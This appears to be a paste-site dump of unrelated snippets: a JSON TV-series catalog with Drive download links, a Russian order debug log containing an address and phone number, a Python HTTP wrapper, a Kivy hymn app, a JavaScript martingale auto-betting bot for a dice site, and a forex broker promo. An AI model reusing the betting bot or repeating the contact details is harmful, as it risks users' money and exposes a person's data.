      ""title"": ""Peaky Blinders 4"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    },
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders 4"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    }
  ]
}"
07DWWX9J,Untitled,nkazakov,JSON,Friday 17th of May 2024 06:18:10 AM CDT,"{""data"":{""Response"":{""entity"":{""baskets"":[{""accountId"":1682351,""basketForm"":{""caption"":""Array"",""disabled"":false,""fields"":[{""defaultValue"":""24485402"",""error"":null,""fieldId"":""8191503"",""fieldName"":""paymentMethod"",""fields"":null,""options"":[{""fields"":null,""text"":""Наличный"",""value"":""24485402""},{""fields"":null,""text"":""Безналичный"",""value"":""24485403""}],""required"":true,""title"":""Способ оплаты"",""type"":4,""typeName"":""SelectField"",""validation"":null},{""defaultValue"":""24485404"",""error"":null,""fieldId"":""8191504"",""fieldName"":""shipmentAddress"",""fields"":null,""options"":[{""fields"":null,""text"":""196158, Санкт-Петербург г, Московское ш, дом № 7,  # ТЦ Торговый двор звонить за 30 мин +7 (985) 907-85-35 ТК МАЙЕР"",""value"":""24485404""},{""fields"":null,""text"":""196158, Санкт-Петербург г, Московское ш, дом № 7,  # ТЦ Торговый двор звонить за 30 мин +7 (985) 907-85-35 ИП Мацовкин АА."",""value"":""24485405""}],""required"":true,""title"":""Адреса доставки"",""type"":4,""typeName"":""SelectField"",""validation"":null},{""defaultValue"":"""",""error"":null,""fieldId"":""8191505"",""fieldName"":""shipmentDate"",""fields"":null,""options"":[{""fields"":null,""text"":""2024-05-17 (пт)"",""value"":""24485406""},{""fields"":null,""text"":""2024-05-18 (сб)"",""value"":""24485407""},{""fields"":null,""text"":""2024-05-19 (вс)"",""value"":""24485408""},{""fields"":null,""text"":""2024-05-20 (пн)"",""value"":""24485409""},{""fields"":null,""text"":""2024-05-21 (вт)"",""value"":""24485410""},{""fields"":null,""text"":""2024-05-22 (ср)"",""value"":""24485411""},{""fields"":null,""text"":""2024-05-23 (чт)"",""value"":""24485412""},{""fields"":null,""text"":""2024-05-24 (пт)"",""value"":""24485413""},{""fields"":null,""text"":""2024-05-25 (сб)"",""value"":""24485414""},{""fields"":null,""text"":""2024-05-26 (вс)"",""value"":""24485415""}],""required"":true,""title"":""Дата доставки"",""type"":4,""typeName"":""SelectField"",""validation"":null},{""defaultValue"":"""",""error"":null,""fieldId"":""8191506"",""fieldName"":""comment"",""fields"":null,""options"":null,""required"":false,""title"":""Комментарий к заказу"",""type"":3,""typeName"":""TextareaField"",""validation"":null}],""formId"":""1267503"",""formName"":null,""title"":null},""basketId"":""1271748"",""basketItems"":[{""article"":""800720"",""available"":null,""basketItemId"":""19442416"",""brand"":""Sintec"",""delivery"":null,""fields"":null,""orderHash"":""eyJ0aW1lIjoiMTc6MDU6MjAyNCIsImFydGljbGUiOiI4MDA3MjAiLCJicmFuZCI6IlNpbnRlYyIsInRpdGxlIjoiXHUwNDE2XHUwNDM4XHUwNDM0XHUwNDNhXHUwNDNlXHUwNDQxXHUwNDQyXHUwNDRjIFx1MDQ0Mlx1MDQzZVx1MDQ0MFx1MDQzY1x1MDQzZVx1MDQzN1x1MDQzZFx1MDQzMFx1MDQ0ZiBTaW50ZWMgXHUwNDE0XHUwNDM3XHUwNDM1XHUwNDQwXHUwNDM2XHUwNDM4XHUwNDNkXHUwNDQxXHUwNDNhXHUwNDM4XHUwNDM5IERPVC00IDkxMFx1MDQzMyA4MDA3MjAiLCJ3YXJlaG91c2UiOiJcdTA0MjFcdTA0M2FcdTA0M2JcdTA0MzBcdTA0MzQgXHUwNDMyXHUwNDRiXHUwNDM0XHUwNDMwXHUwNDQ3XHUwNDM4In0="",""price"":""201.7"",""priceTotal"":""201.7"",""quantity"":1,""title"":""Жидкость тормозная Sintec Дзержинский DOT-4 910г 800720"",""warehouse"":""Склад выдачи""}],""hasPartOrder"":true,""vendorId"":""61e309b7-9c6e-45cf-9df6-8467ecc2e585"",""vendorTitle"":""Авторусь (API)""}],""status"":true},""errors"":null,""warnings"":null}},""level"":""debug"",""message"":""response"",""now"":""2024-05-17T11:04:28.740Z"",""timestamp"":""2024-05-17 11:04:28""}"
7BviMc3V,Untitled,evstratbg,Python,Friday 17th of May 2024 06:16:39 AM CDT,"import requests

class APIRequester:
    def get(self, url, params=None, headers=None):
        r""""""
        Sends a GET request.

        Args:
            url (str): The URL to send the GET request to.
            params (dict, optional): The URL parameters to append to the URL. Defaults to None.
            headers (dict, optional): The headers to send with the request. Defaults to None.

        Returns:
            response (`requests.Response`): The response of the GET request. See [requests.Response](https://requests.readthedocs.io/en/latest/api/#requests.Response).
        Example:
            ```python
            from api_requester import APIRequester

            requester = APIRequester()
            response = requester.get('https://api.example.com/data', params={'key': 'value'})
            print(response.status_code)
            ```
        """"""
        response = requests.get(url, params=params, headers=headers)
        return response

    def post(self, url, data=None, json=None, headers=None):
        """"""
        Sends a POST request.

        Args:
            url (str): The URL to send the POST request to.
            data (dict or bytes, optional): The form data to send in the body of the request. Defaults to None.
            json (dict, optional): The JSON data to send in the body of the request. Defaults to None.
            headers (dict, optional): The headers to send with the request. Defaults to None.

        Returns:
            requests.Response: The response of the POST request.

        Example:
            ```python
            requester = APIRequester()
            response = requester.post('https://api.example.com/data', json={'key': 'value'})
            print(response.status_code)
            ```
        """"""
        response = requests.post(url, data=data, json=json, headers=headers)
        return response

    def put(self, url, data=None, json=None, headers=None):
        """"""
        Sends a PUT request.

        Args:
            url (str): The URL to send the PUT request to.
            data (dict or bytes, optional): The form data to send in the body of the request. Defaults to None.
            json (dict, optional): The JSON data to send in the body of the request. Defaults to None.
            headers (dict, optional): The headers to send with the request. Defaults to None.

        Returns:
            requests.Response: The response of the PUT request.

        Example:
            ```python
            requester = APIRequester()
            response = requester.put('https://api.example.com/data', json={'key': 'value'})
            print(response.status_code)
            ```
        """"""
        response = requests.put(url, data=data, json=json, headers=headers)
        return response

    def patch(self, url, data=None, json=None, headers=None):
        """"""
        Sends a PATCH request.

        Args:
            url (str): The URL to send the PATCH request to.
            data (dict or bytes, optional): The form data to send in the body of the request. Defaults to None.
            json (dict, optional): The JSON data to send in the body of the request. Defaults to None.
            headers (dict, optional): The headers to send with the request. Defaults to None.

        Returns:
            requests.Response: The response of the PATCH request.

        Example:
            ```python
            requester = APIRequester()
            response = requester.patch('https://api.example.com/data', json={'key': 'value'})
            print(response.status_code)
            ```
        """"""
        response = requests.patch(url, data=data, json=json, headers=headers)
        return response

    def trace(self, url, headers=None):
        """"""
        Sends a TRACE request.

        Args:
            url (str): The URL to send the TRACE request to.
            headers (dict, optional): The headers to send with the request. Defaults to None.

        Returns:
            requests.Response: The response of the TRACE request.

        Example:
            ```python
            requester = APIRequester()
            response = requester.trace('https://api.example.com/trace')
            print(response.status_code)
            ```
        """"""
        response = requests.request('TRACE', url, headers=headers)
        return response
"
zkHQB3G4,Untitled,jevixlugya,Python,Friday 17th of May 2024 06:14:19 AM CDT,"
from kivymd.app import MDApp
from kivy.lang import Builder
from kivy.uix.screenmanager import Screen
from kivy.uix.button import Button
from kivy.uix.recycleview import RecycleView
from kivy.factory import Factory
from kivy.core.audio import SoundLoader

kv = """"""
#:import Factory kivy.factory.Factory

ScreenManager:
    TableOfContentsScreen:
    ContentScreen:
    search:

<PageButton>:
    on_release: self.go_to_page(self.text)
    id:pagebutton
 
<TableOfContentsScreen>:
    name: 'toc'
    GridLayout:
        id: grid
        rows: 4
        cols: 4
<search>:
    name:'search'
    BoxLayout:
        orientation: 'vertical'
        BoxLayout:
            padding:10
            size_hint_y:1/9 
                       
            TextInput:
                multiline:False
                size_hint_y: None
                height: dp(48)
                hint_text:'search hymn'
                on_text:recycle.search_rv(self.text)
        BoxLayout:
            orientation: 'vertical'
            md_bg_color:1,.5,0,.2
            padding: 4
            RV:
                viewclass: 'mybutton'
                data:self.data
                id:recycle
                RecycleBoxLayout:
                    #spacing: 5
                    #padding : 5
                    default_size: None, None
                    default_size_hint: 1, None
                    size_hint_y: None
                    height: self.minimum_height
                    orientation: 'vertical'


<mybutton@Button>:
    on_press:Factory.PageButton().go_to_page2(self.text)

<ContentScreen>:
    name: 'contents'
    MDBoxLayout:
        orientation: 'vertical'
        #size_hint:self.size
        MDTopAppBar:
            title: 'HYMN'
            #type_height:'large'
            left_action_items: [['arrow-left', lambda x: root.callback()],['sda.png', lambda x: None,]]
            right_action_items: [['magnify',lambda x:root.searchrecycle(),'search']]
            elevation: 1
            md_bg_color:app.theme_cls.accent_color
            specific_text_color:1,1,1,1        

        MDFloatLayout:
            Image:
                id:contim
                source:''
                allow_stretch:True,
                keep_ratio:False


            ScrollView:
                size:self.size
                id:scroll
                effect_cls: 'ScrollEffect'
                size_hint: 1,1
                bar_width:4
                bar_color:app.theme_cls.primary_color
                MDBoxLayout:
                    adaptive_height:True
                    orientation:'vertical'
                    size_hint_y:None
                    height:self.minimum_height
                    width:self.minimum_width
                    cols:1
                    padding:5
                    spacing:20
                    MDLabel:
                        text:""""
                        id:label
                        #font_size:Factory.Settingsscreen().ids.slid.value
                        #color:app.theme_cls.primary_color
                        adaptive_height:True
                        font_style:'H4'
                        #font_name:'fonts/Roboto-BoldItalic.ttf'
                        bold:True

            
            


     
 
""""""
from kivy.animation import Animation 
 
class PageButton(Button):
    hymns = {
        ""Hymn 1"": {
            'tittle':""Gw'oli mutukuvu"",
            'text': ""Ennyimbatext/Gw'oli mutukuvu.txt"",
            'image1':'images/2.jpg',
            'image2':'images/3.jpg',
            'image3':'images/5.jpg'

            },

        'Hymn 2': {
            'text': 'Ennyimbatext/hymn2.txt',
            'image1': 'images/4.jpg',
            'image2':'images/david.jpg',
            'image3':'images/jesus1.jpg' }                              
         }   
    def go_to_page(self,text):

        app = MDApp.get_running_app()
        sm = app.root
        sm.get_screen('contents').ids.label.text = self.get_hymn_text()
        sm.current = 'contents'
        sm.get_screen('contents').ids.contim.source=self.get_image_oftext()#'images/singing angels.jpg'

    def get_hymn_text(self):
        app = MDApp.get_running_app()
        global imageId
        self.imageId=app.root.get_screen('contents').ids.contim 
        self.page=self.text
        self.t=self.page

        #global hymns
        
        with open(self.hymns[f'{self.t}']['text']) as f:
            return f.read()
        
    def get_image_oftext(self):
        self.page=self.text
        image1= self.hymns[f'{self.page}']['image2']
        print(type(image1))
        print(image1)
        return image1

    def get_image2_oftext(self):
        self.page=self.text
        image2= self.hymns[f'{self.page}']['image2']
        print(image2)
        return image2

    def get_image3_oftext(self):
        self.page=self.text
        image3= self.hymns[f'{self.page}']['image3']
        return image3

    def get_images_oftext(self):
        pass
        
#here am trying to animate the images from the dict
    def set_animation(self,*args):
        app = MDApp.get_running_app()
        self.imageId=app.root.get_screen('contents').ids.contim
        anim=Animation(opacity=1,duration=1)   
        anim+=Animation(opacity=1,duration=7) 
        anim+=Animation(opacity=0,duration=7) 
        #self.anim.repeat = True
        anim.start(self.imageId)
        anim.bind(on_complete=self.comp)
        

    def comp(self,*args):
        app = MDApp.get_running_app()
        self.imageId=app.root.get_screen('contents').ids.contim
        self.imageId.source=self.get_image_oftext()
        anim=Animation(opacity=1,duration=1)    
        anim+=Animation(opacity=1,duration=7)
        anim+=Animation(opacity=0,duration=7)       
        anim.start(self.imageId)     
        anim.bind(on_complete=self.compl)

    def compl(self,*args):
        app = MDApp.get_running_app()
        self.imageId=app.root.get_screen('contents').ids.contim
        self.imageId.source=self.get_image2_oftext()
        anim=Animation(opacity=1,duration=1)    
        anim+=Animation(opacity=1,duration=7)
        anim+=Animation(opacity=0,duration=7)       
        anim.start(self.imageId)     
        #anim.repeat = True
        anim.bind(on_complete=self.compl2)

    def compl2(self,*args):
        app = MDApp.get_running_app()
        self.imageId=app.root.get_screen('contents').ids.contim
        self.imageId.source=self.get_image3_oftext()
        anim=Animation(opacity=1,duration=1)    
        anim+=Animation(opacity=1,duration=7)
        anim+=Animation(opacity=0,duration=7)       
        anim.start(self.imageId)     
        #anim.repeat = True
        self.set_animation() 
        
class TableOfContentsScreen(Screen):
    def on_kv_post(self, base_widget):
        grid = self.ids.grid
        for i in range(1, 17):
            grid.add_widget(PageButton(text=f'Hymn {i}'))
 
class search(Screen):
    pass
class ContentScreen(Screen):

    def on_enter(self):
        Factory.PageButton().set_animation()
        #print(Factory.PageButton().get_image_oftext (self.hymns))

    def callback(self):
        self.manager.current=('toc')

    def play_audio(self):
        print('playing')
        self.sound=SoundLoader.load('10.mp3')
        self.sound.play()
 
class RV(RecycleView):
    def on_kv_post(self, base_widget):
        self.init_data()
 
    def init_data(self):
        # initialize the data for the recycleview
        self.ennyimba=[
            ""Hymn 1"",""hymn 2 "",'hymn 3','hymn 4','hymn 5','hymn 6','hymn 7','hymn 8','hymn 9','hymn 10','hymn 11'    
        ]
        self.data = [{'text': f'{i}'} for i in self.ennyimba]
 
    def search_rv(self, text):
        if not text:
            self.init_data()
        else:
            self.data = [x for x in self.data if text in x['text']]

class HymnApp(MDApp):
    def build(self):
        return Builder.load_string(kv)
 
 
HymnApp().run()"
4miJbwth,trial,coinwalk,JavaScript,Friday 17th of May 2024 06:13:08 AM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/2400).toFixed(8));
var beast = prefit;
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var winnerdinner = (elderly*24)
var snowy = 0;
var snowie = elderly
var great = elderly
var bolux = false;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((great>(snowy-(prefit*0.5)))&&(great<(snowy+(prefit*0.5)))){
bolux = true;
}else{
bolux = false;
}
if ((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(!bolux)){
    beast = beast*2;
    snowy = parseFloat(great);
}
if (((great/512)<=(beast))&&((great-beast)>tens)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowy = 0;
    snowie = parseFloat(great);
}
if (((great/512)<=(beast))&&((great-beast)>tens)&&(great>(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit;
    snowy = 0;
    snowie = parseFloat(great);
}
if (((great/512)<=(beast))&&((great-beast)>tens)&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit*2;
    snowy = parseFloat(great);
    snowie = parseFloat(great);
}
if (((great/192)<=(beast))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowy = 0;
    snowie = parseFloat(great);
}
if (((great/192)<=(beast))&&(great>(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit;
    snowy = 0;
    snowie = parseFloat(great);
}
if (((great/192)<=(beast))&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit*2;
    snowy = parseFloat(great);
    snowie = parseFloat(great);
}
if ((beast>=(elderly/100))&&(great>snowie)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowy = 0;
    snowie = parseFloat(great);
}
if ((beast>=(elderly/100))&&(great>snowie)&&(great>(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit;
    snowy = 0;
    snowie = parseFloat(great);
}
if ((beast>=(elderly/100))&&(great>snowie)&&(great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))){
    beast = prefit*2;
    snowy = parseFloat(great);
    snowie = parseFloat(great);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 350);
}
go();"
cZy9JJ5a,Review SmartFX,fxvnpro,PHP,Friday 17th of May 2024 06:11:37 AM CDT,"https://www.fxvnpro.com/review-smartfx/
 
Welcome to SmartFX, an international online Forex and CFDs trading firm offering 24 hours access to a diverse range of trading products including forex currency pairs, commodities, futures, indices and stocks. Through SmartFX and the world renowned&nbsp;MetaTrader 5 trading platform,&nbsp;you can take advantage of high liquidity, low spreads, mobile trading, technical analysis and even more.



We maintain high standards to keep trading environments secure, and offer the best tailor made trading conditions for every client. We help Forex traders to develop the knowledge and skills they need to trade efficiently and responsibly.&nbsp;With our Daily Market analysis,&nbsp;we bring the freshest market insights to our beloved clients every day. Experience it for yourself!



We work in one of the most dynamic and fluid industries in the world. As a result, we need to constantly adapt and evolve. At SmartFX, we believe that there’s nothing better than working with the best and brightest minds, so we’re always on the lookout for talented and industrious people to join our growing team.



Broker Logo &nbsp;



BROKER INFORMATION



Broker Type-CompanySmart Securities and Commodities LimitedFoundation2018CountryVanuatuRegulation- Smart Securities and Commodities Limited is Regulated by Vanuatu Financial Services Commission (VFSC)and Authorized to deal with securities with providing all kind of financial services to our clients;Registration number - 40491.- SSC Smart FX Ltd (ex Jin Daocheng Ltd) is a Cyprus Investment Firm, authorized and regulated bythe Cyprus Securities and Exchange Commission (CySec) with license number 316/16;registration number HE345787.Minimum Initial Deposit$200Account Base CurrenciesUSDAccount Deposit MethodsVisa, Master Card, Skrill, Neteller, Wire TransferAccount Withdrawal MethodsVisa, Master Card, Skrill, Neteller, Wire TransferLive ChatYesEmailsupport@smartfx.comCallVanuatu: +678 7773222Dubai: +9714 4319003



ADVANTAGES



Free Demo AccountYesSpreadsCompetitive From 1.2 pipsExecution TypeMarket ExecutionIntroducing Brokers ProgramYesSwap FreeNoCopy TradingYesTrading Platforms&nbsp;MetaTrader 5ScalpingYesHedgingYesExpert AdvisorsYesProductsForex, Stocks, Commodities, Indices, Cryptos



DISADVANTAGES



Restrictions- SSC Smart FX Ltd does not offer services to retail&nbsp;clients.- SmartFX does not offer financial services to the following country residents: India, China, N.Korea,United States of America and&nbsp;FATF black listed&nbsp;countries.
"
